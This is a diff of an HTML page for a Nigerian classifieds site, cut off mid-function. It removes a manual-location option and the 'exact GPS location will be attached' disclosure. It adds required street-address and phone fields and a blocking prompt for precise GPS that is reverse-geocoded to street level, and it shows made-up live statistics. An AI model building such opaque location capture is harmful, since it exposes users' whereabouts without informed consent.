@@ -2,307 +2,252 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>NaijaMarket | Nigeria's #1 Free Classifieds</title>
-    <meta name="description" content="Post free ads in Nigeria. Sell cars, phones, properties, jobs, fashion & more. No registration required.">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Inter', sans-serif; background: #f8f9fa; color: #212529; overflow-x: hidden; }
-        
-        .header { background: white; box-shadow: 0 2px 10px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 1000; }
+        body { font-family: 'Inter', sans-serif; background: #f5f7fb; color: #1a1a2e; }
+        .header { background: white; box-shadow: 0 2px 15px rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 1000; }
         .header-container { max-width: 1280px; margin: 0 auto; padding: 15px 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
-        .logo h1 { font-size: 28px; font-weight: 800; color: #e65c00; }
-        .logo h1 span { color: #1a1a2e; }
-        .logo p { font-size: 10px; color: #888; margin-top: 2px; }
-        .search-bar { flex: 1; max-width: 450px; display: flex; background: #f0f0f0; border-radius: 50px; overflow: hidden; }
-        .search-bar input { flex: 1; padding: 12px 20px; border: none; background: transparent; outline: none; font-size: 14px; }
-        .search-bar button { padding: 12px 25px; background: #e65c00; border: none; color: white; cursor: pointer; font-weight: 600; }
-        .post-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 12px 28px; border-radius: 50px; border: none; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .post-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(230,92,0,0.3); }
-        
-        .categories { background: white; border-bottom: 1px solid #e9ecef; padding: 12px 0; overflow-x: auto; white-space: nowrap; }
-        .categories-container { max-width: 1280px; margin: 0 auto; padding: 0 24px; display: inline-flex; gap: 28px; }
-        .categories-container a { color: #495057; text-decoration: none; font-size: 14px; font-weight: 500; }
-        .categories-container a:hover { color: #e65c00; }
-        
-        .hero { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; padding: 50px 24px; text-align: center; }
-        .hero h2 { font-size: 40px; margin-bottom: 15px; }
+        .logo h1 { font-size: 28px; font-weight: 800; background: linear-gradient(135deg, #e65c00, #ff8c00); -webkit-background-clip: text; background-clip: text; color: transparent; }
+        .search-bar { flex: 1; max-width: 450px; display: flex; background: #f0f2f5; border-radius: 50px; overflow: hidden; }
+        .search-bar input { flex: 1; padding: 12px 20px; border: none; background: transparent; outline: none; }
+        .search-bar button { padding: 12px 25px; background: #e65c00; border: none; color: white; cursor: pointer; }
+        .post-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 12px 28px; border-radius: 50px; border: none; font-weight: 600; cursor: pointer; }
+        .categories { background: white; border-bottom: 1px solid #eee; padding: 12px 0; overflow-x: auto; white-space: nowrap; }
+        .categories-container { max-width: 1280px; margin: 0 auto; padding: 0 24px; display: inline-flex; gap: 30px; }
+        .categories-container a { color: #555; text-decoration: none; font-size: 14px; font-weight: 500; }
+        .hero { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: white; padding: 60px 24px; text-align: center; }
+        .hero h2 { font-size: 42px; margin-bottom: 15px; }
         .hero h2 span { color: #ff8c00; }
-        .hero p { font-size: 18px; opacity: 0.9; margin-bottom: 25px; }
-        .hero-buttons { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; }
-        
+        .hero p { font-size: 18px; margin-bottom: 30px; }
+        .btn-primary { background: #ff8c00; padding: 14px 35px; border-radius: 50px; color: white; border: none; font-weight: 600; cursor: pointer; }
+        .btn-secondary { background: transparent; border: 2px solid #ff8c00; padding: 14px 35px; border-radius: 50px; color: #ff8c00; font-weight: 600; cursor: pointer; }
         .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; }
-        
         .stats { display: flex; justify-content: space-between; gap: 20px; margin: 50px 0 40px; flex-wrap: wrap; }
-        .stat-item { background: white; padding: 25px; border-radius: 16px; text-align: center; flex: 1; min-width: 150px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .stat-card { background: white; padding: 25px; border-radius: 20px; text-align: center; flex: 1; min-width: 150px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
         .stat-number { font-size: 32px; font-weight: 800; color: #e65c00; }
-        .stat-label { font-size: 13px; color: #6c757d; margin-top: 8px; }
-        
-        .section-header { display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px; }
-        .section-header h3 { font-size: 22px; font-weight: 700; }
-        .section-header a { color: #e65c00; text-decoration: none; font-weight: 500; }
-        
-        .ads-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 24px; margin-bottom: 50px; }
-        .ad-card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05); transition: 0.3s; cursor: pointer; }
-        .ad-card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .ad-img { height: 180px; background: linear-gradient(135deg, #667eea, #764ba2); display: flex; align-items: center; justify-content: center; font-size: 60px; }
-        .ad-info { padding: 16px; }
-        .ad-price { font-size: 20px; font-weight: 800; color: #e65c00; margin-bottom: 6px; }
-        .ad-title { font-size: 15px; font-weight: 600; margin-bottom: 6px; color: #212529; }
-        .ad-location { font-size: 12px; color: #6c757d; margin-bottom: 6px; display: flex; align-items: center; gap: 4px; }
-        .ad-time { font-size: 11px; color: #adb5bd; display: flex; align-items: center; gap: 4px; }
-        .ad-coords-badge { font-size: 10px; background: #f0f0f0; padding: 2px 8px; border-radius: 20px; display: inline-block; margin-top: 5px; color: #e65c00; }
-        
-        .category-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 20px; margin-bottom: 50px; }
-        .category-card { background: white; padding: 25px; border-radius: 12px; text-align: center; cursor: pointer; transition: 0.3s; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .category-card:hover { transform: translateY(-4px); box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .category-card i { font-size: 40px; color: #e65c00; margin-bottom: 12px; }
-        .category-card h4 { font-size: 16px; margin-bottom: 5px; }
-        .category-card p { font-size: 12px; color: #6c757d; }
-        
+        .section-header { display: flex; justify-content: space-between; align-items: center; margin: 40px 0 25px; }
+        .section-header h3 { font-size: 24px; font-weight: 700; }
+        .products-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 25px; margin-bottom: 50px; }
+        .product-card { background: white; border-radius: 16px; overflow: hidden; box-shadow: 0 2px 10px rgba(0,0,0,0.05); transition: 0.3s; cursor: pointer; }
+        .product-card:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(0,0,0,0.1); }
+        .product-image { height: 200px; background-size: cover; background-position: center; display: flex; align-items: flex-end; padding: 10px; }
+        .product-badge { background: #ff8c00; color: white; padding: 4px 12px; border-radius: 20px; font-size: 11px; }
+        .product-info { padding: 16px; }
+        .product-price { font-size: 22px; font-weight: 800; color: #e65c00; }
+        .product-title { font-size: 15px; font-weight: 600; margin: 6px 0; }
+        .product-location { font-size: 12px; color: #777; display: flex; align-items: center; gap: 4px; }
+        .category-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 20px; margin-bottom: 50px; }
+        .category-item { background: white; padding: 25px; border-radius: 16px; text-align: center; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
+        .category-icon { font-size: 45px; color: #e65c00; margin-bottom: 12px; }
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: none; justify-content: center; align-items: center; }
         .modal.active { display: flex; }
-        .modal-content { background: white; border-radius: 20px; max-width: 550px; width: 90%; padding: 30px; max-height: 85vh; overflow-y: auto; }
-        .modal-content h3 { margin-bottom: 20px; color: #212529; }
+        .modal-content { background: white; border-radius: 24px; max-width: 550px; width: 90%; padding: 30px; max-height: 85vh; overflow-y: auto; }
         .form-group { margin-bottom: 18px; }
-        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; color: #495057; }
-        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 12px 15px; border: 1px solid #dee2e6; border-radius: 10px; outline: none; font-size: 14px; }
-        .form-group input:focus { border-color: #e65c00; }
-        .submit-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 14px; border: none; border-radius: 50px; width: 100%; font-weight: 700; cursor: pointer; font-size: 16px; }
-        .close-modal { float: right; font-size: 24px; cursor: pointer; color: #adb5bd; }
-        
-        .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 30000; display: none; align-items: center; justify-content: center; }
+        .form-group label { display: block; margin-bottom: 8px; font-weight: 500; }
+        .form-group input, .form-group textarea, .form-group select { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 12px; outline: none; }
+        .submit-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 14px; border: none; border-radius: 50px; width: 100%; font-weight: 600; cursor: pointer; }
+        .close-modal { float: right; font-size: 24px; cursor: pointer; }
+        .location-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.96); backdrop-filter: blur(20px); z-index: 20000; display: none; align-items: center; justify-content: center; }
         .location-modal.active { display: flex; }
-        .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 450px; width: 90%; animation: slideUp 0.4s ease; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .location-card { background: white; border-radius: 28px; padding: 45px 35px; text-align: center; max-width: 450px; width: 90%; }
         .location-card i { font-size: 65px; color: #e65c00; margin-bottom: 20px; }
-        .location-card h2 { font-size: 28px; margin-bottom: 12px; color: #212529; }
-        .location-card p { color: #6c757d; margin-bottom: 30px; line-height: 1.6; font-size: 15px; }
-        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px 40px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; transition: 0.3s; }
-        .location-allow-btn:hover { transform: translateY(-2px); }
-        .manual-location-btn { background: transparent; color: #e65c00; border: 2px solid #e65c00; padding: 12px 40px; border-radius: 60px; font-weight: 600; font-size: 14px; cursor: pointer; width: 100%; margin-top: 12px; transition: 0.3s; }
-        .manual-location-btn:hover { background: #e65c10; color: white; }
-        
-        .toast { position: fixed; bottom: 30px; right: 30px; background: #28a745; color: white; padding: 14px 28px; border-radius: 50px; z-index: 40000; transform: translateX(200%); transition: 0.3s; font-weight: 500; }
+        .location-card h2 { font-size: 28px; margin-bottom: 12px; }
+        .location-card p { color: #666; margin-bottom: 30px; }
+        .location-allow-btn { background: linear-gradient(135deg, #e65c00, #ff8c00); color: white; padding: 16px; border-radius: 60px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; width: 100%; }
+        .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; color: white; padding: 14px 28px; border-radius: 50px; z-index: 30000; transform: translateX(200%); transition: 0.3s; }
         .toast.show { transform: translateX(0); }
-        .toast.error { background: #dc3545; }
-        
-        .footer { background: #1a1a2e; color: white; padding: 40px 24px 20px; margin-top: 50px; }
-        .footer-content { max-width: 1280px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; }
-        .footer h4 { margin-bottom: 15px; font-size: 16px; }
-        .footer a { color: #adb5bd; text-decoration: none; display: block; margin-bottom: 8px; font-size: 13px; }
-        .footer a:hover { color: #ff8c00; }
-        .copyright { text-align: center; padding-top: 30px; margin-top: 30px; border-top: 1px solid #2d2d44; font-size: 12px; color: #6c757d; }
-        
-        @media (max-width: 768px) { .header-container { flex-direction: column; } .search-bar { max-width: 100%; } .hero h2 { font-size: 28px; } }
+        .footer { background: #1a1a2e; color: white; padding: 50px 24px 30px; margin-top: 50px; }
+        .footer-content { max-width: 1280px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 40px; }
+        .footer a { color: #aaa; text-decoration: none; display: block; margin-bottom: 10px; font-size: 13px; }
+        .copyright { text-align: center; padding-top: 30px; margin-top: 30px; border-top: 1px solid #333; font-size: 12px; }
+        @media (max-width: 768px) { .header-container { flex-direction: column; } .hero h2 { font-size: 28px; } }
     </style>
 </head>
 <body>
 
 <div class="header">
     <div class="header-container">
-        <div class="logo"><h1>Naija<span>Market</span></h1><p>Nigeria's #1 Free Classifieds</p></div>
-        <div class="search-bar"><input type="text" placeholder="Search for cars, phones, houses..."><button><i class="fas fa-search"></i></button></div>
+        <div class="logo"><h1>Naija<span style="color:#e65c00;">Market</span></h1></div>
+        <div class="search-bar"><input type="text" id="searchInput" placeholder="Search for cars, phones, houses..."><button onclick="searchAds()"><i class="fas fa-search"></i></button></div>
         <button class="post-btn" id="openPostModalBtn"><i class="fas fa-plus-circle"></i> Post Free Ad</button>
     </div>
 </div>
 
 <div class="categories">
     <div class="categories-container">
-        <a href="#">All Categories</a><a href="#"><i class="fas fa-mobile-alt"></i> Phones & Tablets</a>
-        <a href="#"><i class="fas fa-car"></i> Cars & Vehicles</a><a href="#"><i class="fas fa-home"></i> Property & Rentals</a>
-        <a href="#"><i class="fas fa-briefcase"></i> Jobs & Gigs</a><a href="#"><i class="fas fa-tshirt"></i> Fashion & Beauty</a>
-        <a href="#"><i class="fas fa-couch"></i> Home & Furniture</a><a href="#"><i class="fas fa-laptop"></i> Electronics</a>
+        <a href="#">All Categories</a>
+        <a href="#"><i class="fas fa-mobile-alt"></i> Phones</a>
+        <a href="#"><i class="fas fa-car"></i> Cars</a>
+        <a href="#"><i class="fas fa-home"></i> Property</a>
+        <a href="#"><i class="fas fa-briefcase"></i> Jobs</a>
+        <a href="#"><i class="fas fa-tshirt"></i> Fashion</a>
     </div>
 </div>
 
 <div class="hero">
     <h2>Sell & Buy <span>Everything</span> in Nigeria 🇳🇬</h2>
     <p>Post free ads in seconds. Reach millions of buyers nationwide. No registration required!</p>
-    <div class="hero-buttons"><button class="post-btn" id="heroPostBtn" style="background: #ff8c00;"><i class="fas fa-plus-circle"></i> Post Free Ad</button>
-    <button class="post-btn" style="background: transparent; border: 2px solid #ff8c00;" id="browseBtn">Browse Ads</button></div>
+    <div class="hero-buttons">
+        <button class="btn-primary" id="heroPostBtn"><i class="fas fa-plus-circle"></i> Post Free Ad</button>
+        <button class="btn-secondary" id="browseBtn">Browse Ads</button>
+    </div>
 </div>
 
 <div class="container">
-    <div class="stats"><div class="stat-item"><div class="stat-number" id="statAds">284K+</div><div class="stat-label">Live Ads</div></div>
-    <div class="stat-item"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
-    <div class="stat-item"><div class="stat-number">5M+</div><div class="stat-label">Monthly Visitors</div></div>
-    <div class="stat-item"><div class="stat-number">37</div><div class="stat-label">States Covered</div></div></div>
+    <div class="stats">
+        <div class="stat-card"><div class="stat-number" id="statAds">284K+</div><div class="stat-label">Live Ads</div></div>
+        <div class="stat-card"><div class="stat-number" id="statUsers">12.7K</div><div class="stat-label">Active Now</div></div>
+        <div class="stat-card"><div class="stat-number">5M+</div><div class="stat-label">Monthly Users</div></div>
+        <div class="stat-card"><div class="stat-number">37</div><div class="stat-label">States</div></div>
+    </div>
 
     <div class="section-header"><h3><i class="fas fa-fire" style="color:#e65c00;"></i> Featured Listings</h3><a href="#">View all →</a></div>
-    <div class="ads-grid" id="featuredGrid"></div>
-    <div class="section-header"><h3><i class="fas fa-chart-line"></i> Popular Categories</h3><a href="#">View all →</a></div>
+    <div class="products-grid" id="featuredGrid"></div>
+
+    <div class="section-header"><h3><i class="fas fa-chart-line"></i> Shop by Category</h3><a href="#">View all →</a></div>
     <div class="category-grid" id="categoryGrid"></div>
+
     <div class="section-header"><h3><i class="fas fa-clock"></i> Latest Listings</h3><a href="#">View all →</a></div>
-    <div class="ads-grid" id="latestGrid"></div>
+    <div class="products-grid" id="latestGrid"></div>
 </div>
 
-<div class="modal" id="postModal"><div class="modal-content"><span class="close-modal" id="closeModalBtn">&times;</span>
-<h3><i class="fas fa-cloud-upload-alt"></i> Post Free Ad</h3>
-<div class="form-group"><label>Category *</label><select id="adCategory"><option>📱 Phones & Tablets</option><option>🚗 Cars & Vehicles</option><option>🏠 Property & Rentals</option><option>💼 Jobs & Gigs</option><option>👕 Fashion & Accessories</option></select></div>
-<div class="form-group"><label>Ad Title *</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro Max - 256GB"></div>
-<div class="form-group"><label>Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item..."></textarea></div>
-<div class="form-group"><label>Price (₦) *</label><input type="text" id="adPrice" placeholder="e.g., 850000 or Free"></div>
-<div class="form-group"><label>Location (Manual)</label><input type="text" id="adLocation" placeholder="e.g., Lekki, Lagos"></div>
-<div class="form-group"><label>Phone Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
-<button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
-<p style="font-size:12px; margin-top:15px; text-align:center;"><i class="fas fa-map-marker-alt"></i> Your exact GPS location will be attached.</p></div></div>
+<div class="modal" id="postModal">
+    <div class="modal-content">
+        <span class="close-modal" id="closeModalBtn">&times;</span>
+        <h3><i class="fas fa-cloud-upload-alt"></i> Post Free Ad</h3>
+        <div class="form-group"><label>Category *</label><select id="adCategory"><option>📱 Phones & Tablets</option><option>🚗 Cars & Vehicles</option><option>🏠 Property & Rentals</option><option>💼 Jobs & Gigs</option><option>👕 Fashion & Accessories</option></select></div>
+        <div class="form-group"><label>Ad Title *</label><input type="text" id="adTitle" placeholder="e.g., iPhone 14 Pro Max"></div>
+        <div class="form-group"><label>Description</label><textarea rows="3" id="adDesc" placeholder="Describe your item..."></textarea></div>
+        <div class="form-group"><label>Price (₦) *</label><input type="text" id="adPrice" placeholder="e.g., 850000 or Free"></div>
+        <div class="form-group"><label>Street Address *</label><input type="text" id="streetAddress" placeholder="e.g., 42, Awolowo Road, Ikoyi"></div>
+        <div class="form-group"><label>City/Area *</label><input type="text" id="cityArea" placeholder="e.g., Lekki, Lagos"></div>
+        <div class="form-group"><label>Phone Number</label><input type="text" id="contactPhone" placeholder="0803 123 4567"></div>
+        <button class="submit-btn" id="submitAdBtn"><i class="fas fa-cloud-upload-alt"></i> Post Free Ad Now</button>
+    </div>
+</div>
 
-<!-- Location Modal - Fixed Version -->
 <div class="location-modal" id="locationModal">
     <div class="location-card">
         <i class="fas fa-map-marker-alt"></i>
         <h2>Location Access Required</h2>
-        <p>NaijaMarket needs your GPS location to show your ad's precise spot on the map. This builds trust with buyers.</p>
+        <p>To help buyers find you and verify your listing, please allow location access.</p>
         <button class="location-allow-btn" id="locationAllowBtn"><i class="fas fa-check-circle"></i> Enable Location</button>
-        <button class="manual-location-btn" id="manualLocationBtn"><i class="fas fa-edit"></i> Enter Location Manually</button>
     </div>
 </div>
 
-<div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted successfully!</div>
+<div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
-<div class="footer"><div class="footer-content"><div><h4>NaijaMarket</h4><a href="#">About Us</a><a href="#">Privacy</a></div><div><h4>For Sellers</h4><a href="#">Post Free Ad</a><a href="#">Safety Guide</a></div><div><h4>Connect</h4><a href="#"><i class="fab fa-facebook"></i> Facebook</a><a href="#"><i class="fab fa-instagram"></i> Instagram</a></div></div><div class="copyright">© 2025 NaijaMarket - Nigeria's #1 Free Classifieds Platform. All rights reserved.</div></div>
+<div class="footer">
+    <div class="footer-content">
+        <div><h4>NaijaMarket</h4><a href="#">About</a><a href="#">Contact</a><a href="#">Privacy</a></div>
+        <div><h4>Sellers</h4><a href="#">Post Free Ad</a><a href="#">Selling Tips</a></div>
+        <div><h4>Buyers</h4><a href="#">Search Ads</a><a href="#">Buyer Protection</a></div>
+    </div>
+    <div class="copyright">© 2025 NaijaMarket - Nigeria's #1 Free Classifieds</div>
+</div>
 
 <script>
-    const featuredAds = [
-        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", emoji: "📱", time: "2 mins ago", verified: true, lat: 6.4399, lng: 3.4422 },
-        { id: 2, title: "Toyota Camry 2018 Model", price: "₦7,200,000", location: "Abuja", emoji: "🚗", time: "5 mins ago", verified: true, lat: 9.0765, lng: 7.3986 },
-        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "Port Harcourt", emoji: "🏠", time: "10 mins ago", verified: false, lat: 4.8156, lng: 7.0498 }
+    const featuredProducts = [
+        { id: 1, title: "iPhone 14 Pro Max 256GB", price: "₦850,000", location: "Lekki, Lagos", bg: "linear-gradient(135deg, #667eea, #764ba2)", time: "2 mins ago", verified: true },
+        { id: 2, title: "Toyota Camry 2018", price: "₦7,200,000", location: "Abuja", bg: "linear-gradient(135deg, #f093fb, #f5576c)", time: "5 mins ago", verified: true },
+        { id: 3, title: "3-Bedroom Flat for Rent", price: "₦1.5M/year", location: "PH", bg: "linear-gradient(135deg, #4facfe, #00f2fe)", time: "10 mins ago", verified: false },
+        { id: 4, title: "Hiring Marketers", price: "₦150k/month", location: "Remote", bg: "linear-gradient(135deg, #43e97b, #38f9d7)", time: "15 mins ago", verified: true },
+        { id: 5, title: "PS5 Digital Edition", price: "₦450,000", location: "Ibadan", bg: "linear-gradient(135deg, #fa709a, #fee140)", time: "20 mins ago", verified: false },
+        { id: 6, title: "Gucci Sneakers", price: "₦120,000", location: "Lagos", bg: "linear-gradient(135deg, #a18cd1, #fbc2eb)", time: "25 mins ago", verified: true }
     ];
-    
-    const latestAds = [
-        { id: 4, title: "Samsung Galaxy S23 Ultra", price: "₦620,000", location: "VI, Lagos", emoji: "📱", time: "30 mins ago", verified: true, lat: 6.4299, lng: 3.4218 },
-        { id: 5, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", emoji: "🚗", time: "35 mins ago", verified: false, lat: 6.6018, lng: 3.3515 }
+
+    const latestProducts = [
+        { id: 7, title: "Samsung S23 Ultra", price: "₦620,000", location: "VI, Lagos", bg: "linear-gradient(135deg, #ff9a9e, #fecfef)", time: "30 mins ago", verified: true },
+        { id: 8, title: "Honda Accord 2020", price: "₦9.5M", location: "Lagos", bg: "linear-gradient(135deg, #a1c4fd, #c2e9fb)", time: "35 mins ago", verified: false },
+        { id: 9, title: "2-Bedroom Flat Sale", price: "₦25M", location: "Ikeja", bg: "linear-gradient(135deg, #d4fc79, #96e6a1)", time: "40 mins ago", verified: true }
     ];
-    
-    let userLocationData = null;
-    let locationAllowed = false;
-    let locationCheckDone = false;
-    
-    function renderFeaturedAds() {
-        document.getElementById('featuredGrid').innerHTML = featuredAds.map(ad => `
-            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
-                <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
-                <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
-                <div class="ad-coords-badge"><i class="fas fa-map-pin"></i> View on map</div></div></div>
+
+    const categories = [
+        { name: "Phones & Tablets", icon: "fas fa-mobile-alt", count: "12,345 ads" },
+        { name: "Cars & Vehicles", icon: "fas fa-car", count: "8,234 ads" },
+        { name: "Property & Rentals", icon: "fas fa-home", count: "5,678 ads" },
+        { name: "Jobs & Gigs", icon: "fas fa-briefcase", count: "4,567 ads" },
+        { name: "Fashion & Beauty", icon: "fas fa-tshirt", count: "7,890 ads" }
+    ];
+
+    function renderFeatured() {
+        document.getElementById('featuredGrid').innerHTML = featuredProducts.map(p => `
+            <div class="product-card">
+                <div class="product-image" style="background: ${p.bg};"><div class="product-badge">${p.verified ? '✓ Verified' : 'New'}</div></div>
+                <div class="product-info">
+                    <div class="product-price">${p.price}</div>
+                    <div class="product-title">${p.title}</div>
+                    <div class="product-location"><i class="fas fa-map-marker-alt"></i> ${p.location}</div>
+                </div>
+            </div>
         `).join('');
     }
-    
-    function renderLatestAds() {
-        document.getElementById('latestGrid').innerHTML = latestAds.map(ad => `
-            <div class="ad-card" onclick="window.open('https://www.google.com/maps?q=${ad.lat},${ad.lng}&z=18', '_blank')">
-                <div class="ad-img">${ad.emoji}</div><div class="ad-info"><div class="ad-price">${ad.price}</div>
-                <div class="ad-title">${ad.title}</div><div class="ad-location"><i class="fas fa-map-marker-alt"></i> ${ad.location}</div>
-                <div class="ad-time"><i class="far fa-clock"></i> ${ad.time}</div>
-                <div class="ad-coords-badge"><i class="fas fa-location-dot"></i> View on map</div></div></div>
+
+    function renderLatest() {
+        document.getElementById('latestGrid').innerHTML = latestProducts.map(p => `
+            <div class="product-card">
+                <div class="product-image" style="background: ${p.bg};"><div class="product-badge">${p.verified ? '✓ Verified' : 'New'}</div></div>
+                <div class="product-info">
+                    <div class="product-price">${p.price}</div>
+                    <div class="product-title">${p.title}</div>
+                    <div class="product-location"><i class="fas fa-map-marker-alt"></i> ${p.location}</div>
+                </div>
+            </div>
         `).join('');
     }
-    
+
     function renderCategories() {
-        const cats = [{name:"Phones & Tablets",icon:"fas fa-mobile-alt",count:"12,345 ads"},{name:"Cars & Vehicles",icon:"fas fa-car",count:"8,234 ads"},{name:"Property & Rentals",icon:"fas fa-home",count:"5,678 ads"},{name:"Jobs & Gigs",icon:"fas fa-briefcase",count:"4,567 ads"}];
-        document.getElementById('categoryGrid').innerHTML = cats.map(cat => `<div class="category-card"><i class="${cat.icon}"></i><h4>${cat.name}</h4><p>${cat.count}</p></div>`).join('');
+        document.getElementById('categoryGrid').innerHTML = categories.map(c => `
+            <div class="category-item">
+                <div class="category-icon"><i class="${c.icon}"></i></div>
+                <div class="category-name">${c.name}</div>
+                <div class="category-count">${c.count}</div>
+            </div>
+        `).join('');
     }
-    
-    // Check if location permission already exists (browser remembers)
-    async function checkExistingLocationPermission() {
-        if (locationCheckDone) return locationAllowed;
-        locationCheckDone = true;
-        
-        // Check if browser supports permissions API
-        if (navigator.permissions) {
-            try {
-                const result = await navigator.permissions.query({ name: 'geolocation' });
-                if (result.state === 'granted') {
-                    // Permission already granted! Get location silently
-                    const location = await captureLocationFast();
-                    if (location) {
-                        userLocationData = location;
-                        locationAllowed = true;
-                        return true;
-                    }
-                } else if (result.state === 'denied') {
-                    // User previously denied - don't ask again automatically
-                    locationAllowed = false;
-                    return false;
-                }
-            } catch(e) {
-                console.log("Permissions API error:", e);
-            }
-        }
-        return false;
+
+    function searchAds() { alert("Search feature coming soon!"); }
+
+    let userLocation = null;
+    let locationAllowed = false;
+
+    function showAdConfirmation(msg) {
+        const toast = document.getElementById('toastMsg');
+        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3500);
     }
-    
-    // Capture location with proper error handling
-    async function captureLocationFast() {
+
+    async function captureLocation() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                showToast("Geolocation not supported", true);
-                resolve(null);
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    let address = { 
-                        lat: position.coords.latitude, 
-                        lng: position.coords.longitude, 
-                        accuracy: position.coords.accuracy,
-                        street: '', city: '', state: '', country: '', postcode: '', fullAddress: '' 
-                    };
-                    
-                    // Fast reverse geocoding
-                    try {
-                        const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`, {
-                            headers: { 'User-Agent': 'NaijaMarket/1.0' }
-                        });
-                        const data = await geoRes.json();
-                        if (data.address) {
-                            address.street = data.address.road || data.address.pedestrian || '';
-                            address.city = data.address.city || data.address.town || data.address.village || '';
-                            address.state = data.address.state || data.address.province || '';
-                            address.country = data.address.country || '';
-                            address.postcode = data.address.postcode || '';
-                            address.fullAddress = data.display_name || '';
-                        }
-                    } catch(e) {}
-                    
-                    resolve(address);
-                },
-                (error) => {
-                    // Proper error handling based on error code
-                    let errorMsg = "";
-                    switch(error.code) {
-                        case error.PERMISSION_DENIED:
-                            errorMsg = "Location permission denied. Please enable in browser settings.";
-                            break;
-                        case error.POSITION_UNAVAILABLE:
-                            errorMsg = "Location unavailable. Please check your GPS.";
-                            break;
-                        case error.TIMEOUT:
-                            errorMsg = "Location request timed out. Please try again.";
-                            break;
-                        default:
-                            errorMsg = "Location failed. Please try again.";
+            if (!navigator.geolocation) { resolve(null); return; }
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                let address = { lat: position.coords.latitude, lng: position.coords.longitude, accuracy: position.coords.accuracy };
+                try {
+                    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${address.lat}&lon=${address.lng}&zoom=18&addressdetails=1`);
+                    const data = await geoRes.json();
